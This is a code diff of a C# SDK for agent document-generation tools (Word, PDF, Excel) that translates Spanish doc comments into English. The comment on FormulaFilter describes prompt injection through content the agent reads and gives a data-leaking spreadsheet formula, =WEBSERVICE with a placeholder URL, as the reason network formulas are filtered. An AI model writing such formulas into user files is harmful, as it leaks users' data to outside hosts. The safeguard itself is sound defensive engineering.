@@ -4,7 +4,7 @@ using AiSdk.Artifacts;
 
 namespace AiSdk.Documents.Generation;
 
-/// <summary>Atajos para generar documentos.</summary>
+/// <summary>Shortcuts for generating documents.</summary>
 public static class DocumentGenerator
 {
     public const string DocxMediaType = MediaTypes.Docx;
@@ -17,28 +17,28 @@ public static class DocumentGenerator
     /// <summary>Markdown → PDF.</summary>
     public static byte[] ToPdf(string markdown, DocumentStyleOptions? options = null) => PdfWriter.FromMarkdown(markdown, options);
 
-    /// <summary>Tablas Markdown → Excel (una hoja por tabla). Los textos que parecen fórmulas se escriben como texto.</summary>
+    /// <summary>Markdown tables → Excel (one sheet per table). Text that looks like a formula is written as text.</summary>
     public static byte[] ToXlsx(string markdownTables, SheetOptions? options = null) =>
         new SpreadsheetBuilder().AddMarkdownTables(markdownTables, options).Build();
 
-    /// <summary>Objetos → Excel. Los textos que parecen fórmulas se escriben como texto.</summary>
+    /// <summary>Objects → Excel. Text that looks like a formula is written as text.</summary>
     public static byte[] ToXlsx<T>(IEnumerable<T> items, string sheetName = "Datos", SheetOptions? options = null) =>
         new SpreadsheetBuilder().AddSheet(sheetName, items, options).Build();
 }
 
-/// <summary>Opciones de <see cref="DocumentTools"/>.</summary>
+/// <summary>Options for <see cref="DocumentTools"/>.</summary>
 public sealed class DocumentToolOptions
 {
-    /// <summary>Dónde se guardan los archivos (también aparecen como artifacts en la UI).</summary>
+    /// <summary>Where the files are saved (they also appear as artifacts in the UI).</summary>
     public required IArtifactStore Store { get; init; }
 
-    /// <summary>URL pública y otras opciones de artifacts (p. ej. <c>Url = a => $"/artifacts/{a.Id}"</c>).</summary>
+    /// <summary>Public URL and other artifact options (e.g. <c>Url = a => $"/artifacts/{a.Id}"</c>).</summary>
     public ArtifactToolOptions ArtifactOptions { get; init; } = new();
 
-    /// <summary>Estilo base (fuente, colores, tamaño de papel, encabezado...).</summary>
+    /// <summary>Base style (font, colors, paper size, header...).</summary>
     public DocumentStyleOptions Style { get; init; } = new();
 
-    /// <summary>Formatos habilitados.</summary>
+    /// <summary>Enabled formats.</summary>
     public bool Word { get; init; } = true;
 
     public bool Pdf { get; init; } = true;
@@ -46,28 +46,28 @@ public sealed class DocumentToolOptions
     public bool Excel { get; init; } = true;
 
     /// <summary>
-    /// Permite que <c>create_spreadsheet</c> escriba fórmulas (por defecto true, filtradas con <see cref="FormulaFilter"/>):
-    /// el modelo puede escribir <c>=B2*C2</c> o <c>=SUM(B2:B9)</c>. False escribe todo como texto.
+    /// Allows <c>create_spreadsheet</c> to write formulas (true by default, filtered with <see cref="FormulaFilter"/>):
+    /// the model can write <c>=B2*C2</c> or <c>=SUM(B2:B9)</c>. False writes everything as text.
     /// </summary>
     public bool AllowFormulas { get; init; } = true;
 
     /// <summary>
-    /// Fórmulas del modelo que se escriben como tales (por defecto <see cref="SpreadsheetBuilder.IsSafeFormula"/>: solo
-    /// funciones de cálculo, sin red, enlaces, DDE ni otros libros); las demás quedan como texto. El contenido que el
-    /// modelo lee (páginas, correos, documentos) puede inyectarle instrucciones, y una fórmula como
-    /// <c>=WEBSERVICE("https://...?"&amp;A1)</c> filtraría datos cuando el usuario abra el archivo. Null admite cualquiera.
+    /// Model formulas that are written as such (by default <see cref="SpreadsheetBuilder.IsSafeFormula"/>: calculation
+    /// functions only, no network, links, DDE or other workbooks); the rest are left as text. The content the model reads
+    /// (pages, emails, documents) can inject instructions into it, and a formula such as
+    /// <c>=WEBSERVICE("https://...?"&amp;A1)</c> would leak data when the user opens the file. Null allows any formula.
     /// </summary>
     public Func<string, bool>? FormulaFilter { get; init; } = SpreadsheetBuilder.IsSafeFormula;
 }
 
 /// <summary>
-/// Herramientas para que un agente genere archivos Word, PDF y Excel descargables. El agente escribe
-/// Markdown (o datos tabulares) y el SDK produce el archivo con estilos profesionales, lo guarda como
-/// artifact y lo anuncia a la interfaz (<c>data-artifact</c>).
+/// Tools that let an agent generate downloadable Word, PDF and Excel files. The agent writes Markdown (or tabular data)
+/// and the SDK produces the file with professional styles, saves it as an artifact and announces it to the UI
+/// (<c>data-artifact</c>).
 /// </summary>
 public static class DocumentTools
 {
-    /// <summary>Instrucciones de sistema recomendadas.</summary>
+    /// <summary>Recommended system instructions.</summary>
     public const string Instructions =
         """
         Puedes generar archivos descargables: create_word_document y create_pdf a partir de Markdown
